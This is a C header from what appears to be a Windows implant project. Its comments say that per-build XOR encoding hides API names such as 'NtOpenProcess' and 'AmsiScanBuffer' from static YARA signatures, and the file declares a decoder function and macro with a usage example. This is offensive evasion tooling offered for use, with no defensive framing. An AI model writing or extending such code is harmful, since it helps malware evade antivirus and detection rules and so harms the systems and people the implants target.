#pragma once
#include <stddef.h>

/*
 * EVS XOR — compile-time string obfuscation for Windows implants.
 *
 * Problem: strings like "ntdll.dll", "NtOpenProcess", "AmsiScanBuffer" in
 * .rdata are direct YARA match targets — one rule catches every implant that
 * touches these APIs by name.
 *
 * Solution: encode strings at compile time with a random per-build XOR key.
 * No plaintext appears in .rdata. Key changes every build → static YARA fails.
 *
 * Workflow:
 *   1. Add strings to strings.txt
 *   2. Run: python gen_evs.py   (auto-called by `make`)
 *   3. #include "evs_strings.h" in files that need string decoding
 *   4. Decode at runtime, use, then wipe:
 *
 *        char buf[16] = {0};
 *        EVS_D(buf, EVS_dll_ntdll);
 *        HMODULE h = GetModuleHandleA(buf);
 *        SecureZeroMemory(buf, sizeof(buf));
 *
 * Runtime cost: one small XOR loop per decode call.
 * Stack buffers for decoded strings are caller-managed.
 */

/* Runtime decoder (defined in src/evs.c).
 * __attribute__((noinline)) in the .c ensures one code pattern, not N copies. */
void evs_dec(char *out, const unsigned char *enc, size_t n);

/* Decode EVS_<name> array into caller-provided buffer.
 * Buffer must be at least sizeof(EVS_<name>) + 1 bytes (evs_dec appends NUL). */
#define EVS_D(out, arr) evs_dec((out), (arr), sizeof(arr))
